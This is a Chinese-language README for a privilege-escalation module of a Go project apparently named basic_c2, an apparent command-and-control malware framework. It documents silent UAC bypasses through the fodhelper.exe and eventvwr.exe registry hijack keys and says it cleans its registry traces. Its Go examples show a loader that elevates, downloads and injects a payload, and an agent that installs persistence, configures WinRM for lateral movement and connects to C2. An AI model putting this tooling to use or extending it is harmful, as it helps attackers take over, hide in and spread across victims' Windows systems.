# Privilege Escalation Module

权限提升模块，提供 UAC Bypass 功能。

## 功能特性

- ✅ 权限检测（IsAdmin）
- ✅ UAC Bypass（fodhelper.exe - Win10+）
- ✅ UAC Bypass（eventvwr.exe - Win7+）
- ✅ 自动提权并重启
- ✅ 跨平台支持（构建标签隔离）

## 使用方法

### 检测当前权限

```go
import "basic_c2/internal/privilege"

if privilege.IsAdmin() {
    fmt.Println("当前是管理员权限")
} else {
    fmt.Println("当前是普通用户权限")
}
```

### 自动提权

```go
import "basic_c2/internal/privilege"

func main() {
    // 如果不是管理员，自动提权并重启
    if privilege.ElevateAndRestart() {
        // 返回 true 表示已触发提权，当前进程应该退出
        return
    }
    
    // 执行到这里说明已经是管理员权限
    fmt.Println("现在拥有管理员权限")
    
    // 继续执行需要高权限的操作...
}
```

### 手动提权（高级用法）

```go
import "basic_c2/internal/privilege"

pm := privilege.NewPrivilegeManager()

// 检查当前权限级别
level := pm.GetCurrentLevel()

// 尝试提权
shouldExit, err := pm.Elevate()
if err != nil {
    fmt.Printf("提权失败: %v\n", err)
}

if shouldExit {
    // 提权成功，程序会被重新启动，当前进程应该退出
    return
}
```

## 技术原理

### fodhelper.exe UAC Bypass (Win10+)

1. **原理**：fodhelper.exe 是 Windows 系统自带程序，在 UAC 白名单中
2. **利用**：它会读取用户注册表 `HKCU\Software\Classes\ms-settings\shell\open\command`
3. **优势**：静默提权，无 UAC 弹窗，成功率高

### eventvwr.exe UAC Bypass (Win7+)

1. **原理**：事件查看器会读取 `HKCU\Software\Classes\mscfile\shell\open\command`
2. **优势**：兼容老版本 Windows
3. **劣势**：可能被更多 AV 检测

## 注意事项

1. **提权后会重启程序**：`ElevateAndRestart()` 返回 true 时，当前进程应该立即退出
2. **清理痕迹**：提权完成后会自动清理注册表项
3. **失败降级**：如果提权失败，程序会以普通权限继续运行

## 集成示例

### Loader 中使用

```go
func main() {
    // 1. 检测并提权
    if privilege.ElevateAndRestart() {
        return // 等待提权后的进程启动
    }
    
    // 2. 此时已有管理员权限
    // 3. 下载并注入 Agent
    payload := fetch.DownloadPayload()
    inject.Execute(payload)
}
```

### Agent 中使用

```go
func main() {
    // 1. 开机自启动可能以普通权限运行
    if privilege.ElevateAndRestart() {
        return // 等待提权后重启
    }
    
    // 2. 此时已有管理员权限
    // 3. 配置需要高权限的功能
    lateral.ConfigureWinRM()
    persistence.Install()
    
    // 4. 正常运行
    c2.Connect()
}
```

## 文件说明

- `privilege.go` - 核心接口和管理器
- `detect_windows.go` - Windows 权限检测实现
- `detect_stub.go` - 非 Windows 平台桩代码
- `fodhelper_windows.go` - fodhelper UAC Bypass 实现
- `fodhelper_stub.go` - 非 Windows 平台桩代码
